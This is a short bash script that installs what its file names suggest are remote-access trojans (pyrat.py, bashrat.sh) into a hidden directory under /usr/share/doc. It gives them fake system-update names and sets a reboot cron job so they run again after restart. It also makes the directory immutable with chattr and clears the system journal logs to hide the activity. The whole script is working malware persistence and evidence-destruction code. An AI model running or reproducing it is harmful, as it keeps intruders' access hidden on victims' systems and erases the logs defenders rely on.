
#!/bin/bash
HIDDEN_DIR="/usr/share/doc/.python3"
mkdir -p $HIDDEN_DIR
cp core/pyrat.py $HIDDEN_DIR/.sysupdate.py
cp core/bashrat.sh $HIDDEN_DIR/.bashrc_update

(crontab -l 2>/dev/null; echo "@reboot sleep 60 && python3 $HIDDEN_DIR/.sysupdate.py") | crontab -
chattr +i $HIDDEN_DIR 2>/dev/null
journalctl --vacuum-time=1d
